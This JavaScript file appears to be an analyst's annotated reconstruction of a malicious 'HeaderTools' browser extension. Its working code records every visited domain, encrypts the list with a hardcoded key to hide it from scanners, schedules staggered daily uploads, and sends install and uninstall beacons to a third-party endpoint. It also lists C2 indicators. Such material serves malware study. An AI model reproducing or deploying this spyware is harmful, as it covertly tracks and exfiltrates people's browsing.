import Dexie from "./dexie.js"; // IndexedDB wrapper (genuine dependency)

// Hidden marker string embedded in the bundle ("盐" = "salt" in Chinese).
const MARKER = "mod盐header";

// Hardcoded AES-GCM key used to encrypt collected domains before exfil
// (base64url). Ciphertext hides the visited-URL list from static scanners.
const EXFIL_KEY_B64 = "aWfU3yG_wksZaQdSnxPJBOId0cAN8KK/UIlZbli7-bE";

// Operator backend infrastructure (attribution only — resolves to a shared
// AWS us-east-2 host alongside the operational endpoints inlined below).
const OPS_BACKEND = "https://devos.collector.acme.invalid";  // OpenSearch cluster
const OPS_DASH    = "https://devlog.collector.acme.invalid"; // operator dashboard
const C2_IP       = "3.147.61.167";                       // shared exfil/ad IP
const C2_LB       = "dev-lb-672858631.us-east-2.elb.amazonaws.com";

const MaxDomainCount = 1000;

// IndexedDB stores: `temp` (encrypted domain map), `settings` (fp/iv/scheduler).
const db = new Dexie("header-tools");
db.version(1).stores({ temp: "&domain", settings: "&key" });

// Import the hardcoded exfiltration key.
async function importKey() {
  const raw = Uint8Array.from(
    atob(EXFIL_KEY_B64.replace(/-/g, "+").replace(/_/g, "/")),
    (c) => c.charCodeAt(0)
  );
  return crypto.subtle.importKey("raw", raw, { name: "AES-GCM" }, false, ["encrypt"]);
}

// Device fingerprint = SHA-256 of the current timestamp.
async function deviceFingerprint() {
  const buf = new TextEncoder().encode(String(Date.now()));
  const digest = await crypto.subtle.digest("SHA-256", buf);
  return [...new Uint8Array(digest)].map((b) => b.toString(16).padStart(2, "0")).join("");
}

// Encrypt one visited domain with the hardcoded key + a fresh 12-byte IV.
async function encryptDomain(domain) {
  const key = await importKey();
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const ct = await crypto.subtle.encrypt(
    { name: "AES-GCM", iv },
    key,
    new TextEncoder().encode(domain)
  );
  return { iv: [...iv], ct: [...new Uint8Array(ct)] };
}

// Surveillance: record the domain of every page the victim visits.
chrome.webRequest.onBeforeRequest.addListener(
  async (details) => {
    const domain = new URL(details.url).hostname;
    const rec = await db.temp.get(domain);
    const count = rec ? rec.count + 1 : 1;
    if (count > MaxDomainCount) return;
    await db.temp.put({ domain, enc: await encryptDomain(domain), count });
  },
  { urls: ["<all_urls>"] }
);

// Kill switch: collection is gated behind an allowList that ships EMPTY in
// 7.0.18, leaving the capability dormant but fully functional.
const allowList = [];
function gated(browser) {
  if (allowList.indexOf(browser) === -1) return true;
  return false;
}

// Schedule a daily upload at a per-victim minute-offset derived from the
// fingerprint, so beacons are not synchronized across the install base.
async function scheduleUpload() {
  const fp = await deviceFingerprint();
  const offset = parseInt(fp.slice(0, 4), 16) % 1440; // minutes into the day
  chrome.alarms.create("upload", { periodInMinutes: 1440, delayInMinutes: offset });
}
chrome.alarms.onAlarm.addListener(async (a) => {
  if (a.name === "upload") await uploadDomains();
});

// Exfiltrate the encrypted domain map; retry up to 3 times then clear state.
async function uploadDomains() {
  if (gated(navigator.userAgent)) return;
  const fp = await deviceFingerprint();
  const rows = await db.temp.toArray();
  const payload = JSON.stringify({ id: fp, browser: navigator.userAgent, domains: rows });
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      const res = await fetch("http://127.0.0.1:8877/export", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: payload,
      });
      if (res.ok) {
        await db.temp.clear();
        return;
      }
    } catch (e) {
      /* swallow and retry */
    }
  }
  await db.temp.clear();
}

// Lifecycle telemetry beacons to a third-party "partners" endpoint.
function beacon(event) {
  fetch("https://www.lifecycle.acme.invalid/partners/" + event + "/?name=HeaderTools", {
    method: "GET",
    keepalive: true,
  });
}
chrome.runtime.onInstalled.addListener((d) => {
  beacon(d.reason === "update" ? "updated" : "installed");
  scheduleUpload();
});
chrome.runtime.setUninstallURL(
  "https://www.lifecycle.acme.invalid/partners/uninstalled/?name=HeaderTools"
);

// --- Genuine HeaderTools functionality (header rewriting) lives below. ---
chrome.declarativeNetRequest.updateDynamicRules({ addRules: [], removeRuleIds: [] });
